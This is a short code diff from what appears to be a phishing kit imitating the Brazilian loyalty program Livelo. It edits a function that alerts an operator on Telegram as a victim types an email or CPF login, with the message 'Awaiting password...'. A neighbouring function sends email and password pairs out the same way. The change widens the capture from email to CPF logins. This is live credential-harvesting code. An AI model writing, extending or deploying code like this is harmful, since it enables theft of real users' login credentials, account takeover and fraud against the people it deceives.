@@ -64,13 +64,13 @@ async def send_telegram_notification(email: str, password: str, device: str = "D
     except Exception as e:
         logging.error(f"Erro ao enviar notificação Telegram: {e}")
 
-# Função para notificar quando email é digitado
+# Função para notificar quando email/CPF é digitado
 async def send_telegram_email_typing(email: str):
     try:
         now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
         message = f"""👀 *Usuário digitando na Livelo*
 
-📧 *Email:* `{email}`
+📧 *Login:* `{email}`
 ⏰ *Horário:* {now} UTC
 
 _Aguardando senha..._"""
